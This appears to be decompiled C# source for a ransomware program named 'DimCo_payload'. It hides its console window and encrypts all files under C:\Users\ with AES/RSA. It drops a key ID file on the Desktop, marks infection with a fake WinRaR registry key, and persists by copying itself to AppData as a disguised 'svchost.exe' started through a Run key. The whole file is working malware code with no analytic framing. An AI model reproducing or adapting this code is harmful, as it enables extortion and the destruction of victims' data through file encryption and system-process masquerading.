using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using DimCo_payload.Encryption;
using Microsoft.Win32;
using Newtonsoft.Json;

namespace DimCo_payload;

internal static class Program
{
	public static byte[] Base64Decode(string base64EncodedData)
	{
		return Convert.FromBase64String(base64EncodedData);
	}

	private static void decryption()
	{
		Console.WriteLine("key: ");
		setup(Console.ReadLine());
	}

	private static void setup(string xml)
	{
		foreach (string item in global.encrypted)
		{
			try
			{
				if (global.Keys.PrivateKey == null)
				{
					break;
				}
				Console.WriteLine("decrypting " + item);
				Tuple<byte[], byte[]> encoded = JsonConvert.DeserializeObject<Tuple<byte[], byte[]>>(File.ReadAllText(item));
				File.WriteAllBytes(item, DimCo_payload.Encryption.Encryption.Decrypt_File_AESRSA(encoded, xml));
				File.Move(item, Path.ChangeExtension(item, null));
			}
			catch
			{
				Console.WriteLine("Incorrect key. Try again.");
				decryption();
			}
		}
	}

	public static string Base64Encode(byte[] plainText)
	{
		return Convert.ToBase64String(plainText);
	}

	public static string[] Split(this string str, string separator)
	{
		return Regex.Split(str, separator);
	}

	private static void check()
	{
		new Mutex(initiallyOwned: true, global.mutex, out var createdNew);
		if (!createdNew)
		{
			Application.Exit();
		}
	}

	private static void key_setup()
	{
		global.Keys = DimCo_payload.Encryption.Encryption.RSA.GenerateKeys(2048);
		string s = DimCo_payload.Encryption.Encryption.RandomString(16, 16);
		byte[] plainText = DimCo_payload.Encryption.Encryption.AES.AES_Encrypt(Encoding.UTF8.GetBytes(global.Keys.PrivateKey), Encoding.UTF8.GetBytes(s));
		byte[] plainText2 = DimCo_payload.Encryption.Encryption.RSA.Encrypt(Encoding.UTF8.GetBytes(s), 2048, global.masterkey);
		File.WriteAllText("C:\\ProgramData\\IDKEY.txt", Base64Encode(plainText2) + "<ID>" + Base64Encode(plainText));
		File.Copy("C:\\ProgramData\\IDKEY.txt", "C:\\Users\\" + Environment.UserName + "\\Desktop\\IDKEY.txt");
	}

	private static byte[] GetByteArray(int size)
	{
		Random random = new Random();
		byte[] array = new byte[size];
		random.NextBytes(array);
		return array;
	}

	private static void infection_marker()
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\WinRaR_08946151201605");
		registryKey.SetValue("winrar", GetByteArray(64));
		registryKey.Close();
	}

	[DllImport("kernel32.dll")]
	private static extern uint WinExec(string lpCmdLine, uint uCmdShow);

	private static void dropper()
	{
		try
		{
			if (Application.get_StartupPath() != "C:\\Users\\" + Environment.UserName + "\\Appdata\\Roaming\\Installer\\{B800B7F1-AEAE-8ABE-035C-6F26E3333CE4}\\svchost.exe")
			{
				if (!Directory.Exists("C:\\Users\\" + Environment.UserName + "\\Appdata\\Roaming\\Installer"))
				{
					Directory.CreateDirectory("C:\\Users\\" + Environment.UserName + "\\Appdata\\Roaming\\Installer");
				}
				Directory.CreateDirectory("C:\\Users\\" + Environment.UserName + "\\Appdata\\Roaming\\Installer\\{B800B7F1-AEAE-8ABE-035C-6F26E3333CE4}");
				File.Copy(Application.get_ExecutablePath(), "C:\\Users\\" + Environment.UserName + "\\Appdata\\Roaming\\Installer\\{B800B7F1-AEAE-8ABE-035C-6F26E3333CE4}\\svchost.exe");
				Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("windows host process ", Application.get_ExecutablePath());
				WinExec("C:\\Users\\" + Environment.UserName + "\\Appdata\\Roaming\\Installer\\{B800B7F1-AEAE-8ABE-035C-6F26E3333CE4}\\svchost.exe", 0u);
				Application.Exit();
			}
		}
		catch
		{
		}
	}

	private static bool is_infected()
	{
		if (Registry.CurrentUser.OpenSubKey("SOFTWARE\\WinRaR_08946151201605") != null)
		{
			return true;
		}
		return false;
	}

	private static void Main()
	{
		try
		{
			global.ShowWindow(global.GetConsoleWindow(), 0);
			if (!is_infected())
			{
				check();
				key_setup();
				DimCo_payload.Encryption.Encryption.Encrypt_Dir("C:\\Users\\", global.Keys.PublicKey);
				File.WriteAllLines("C:\\ProgramData\\DO_NOT_REMOVE.txt", global.encrypted);
				infection_marker();
				Application.SetCompatibleTextRenderingDefault(false);
				Application.Run((Form)(object)new Form1());
			}
			else
			{
				Application.SetCompatibleTextRenderingDefault(false);
				Application.Run((Form)(object)new Form1());
			}
		}
		catch
		{
		}
	}
}
